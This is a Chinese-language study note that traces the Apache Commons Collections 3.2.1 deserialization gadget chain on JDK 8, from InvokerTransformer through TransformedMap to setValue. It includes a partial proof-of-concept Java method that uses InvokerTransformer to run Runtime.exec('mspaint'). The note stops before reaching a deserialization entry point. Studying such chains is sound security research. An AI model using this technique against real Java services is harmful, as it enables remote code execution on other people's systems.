# 参考链接：
https://xz.aliyun.com/t/12715
# 一、环境
common-collection 3.2.1版本 jdk1.8版本下的POC复现 =============>  ：[maven仓库地址](https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1)
在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用

InvokerTransformer类中
	属性：调用的方法名，参数列表
	transform方法，参数为对象。效果是调用此对象的方法，方法名为属性中的方法名，参数列表也是
以下找哪里调用了transform
在TransformedMap的保护方法checkSetValue方法中，调用了transform
这里调用的对象是valueTransformer对象
此对象可以通过
```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
    return new TransformedMap(map, keyTransformer, valueTransformer);  
}
```
以上静态公开方法进行赋值，checkSetValue方法，有参数是对象，并赋值给transfer方法。
**到目前**我们可以确定，我们可以创建invokerTransfomer对象，通过decorate函数将这个对象赋值到checkSetValue函数中调用transform函数的对象，实现invokerTransfomer.transform方法的调用（这里实际上就是能够控制最后代码执行时的方法名和参数列表）

下面要找哪里调用了checkSetValue，以争取对value参数（最终代码执行的那个对象）的控制。

在 TransformedMap类的父抽象类AbstractInputCheckedMapDecorator中的setvalue方法中调用了checkSetValue方法
![[Pasted image 20231116202850.png]]
仔细观察，entry.setvalue(value)，点进去看看
![[Pasted image 20231116203000.png]]
这里的SetValue方法实际就是Map接口的内部接口Entry接口的一个抽象方法。那么在哪里会调用这个setValue方法呢；我们可以想到就是在给map对象的一个二元组（entry）赋值的时候会调用。
**到这里为止，我们可以对前面的利用链进行验证了**
```java
public static void test02(){  
    //创建对象，执行这个对象的transfor方法就是我们的目标  
    InvokerTransformer transformer = new InvokerTransformer("exec", new Class[]{String.class},  
            new Object[]{"mspaint"});  
    Map<String,Object>map = new HashedMap();  
    //注意这里的map一定要赋值，具体原因在AbstractMapDecorator抽象类的构造方法中，可以进入下面的decorate方法，一直进入super，会发现如果为空抛出异常  
    map.put("hh","jj");  
    //将创建的对象复制给他  
    Map <Object,Object>decorate = TransformedMap.decorate(map, null, transformer);  
    //上面实际已经把函数名和参数准备好了  
    //这里为撒不是随便一个map就行，而是非要使用decorate这个map，  
    // 因为不同的map会分别调用他们重写的setvalue方法，而我们需要调用的是TransformedMap的setvalue方法  
    for(Map.Entry entry : decorate.entrySet()){  
        entry.setValue(Runtime.getRuntime());  
    }  
}
```

接下来，我们要看的就是哪里的对象调用了setValue方法。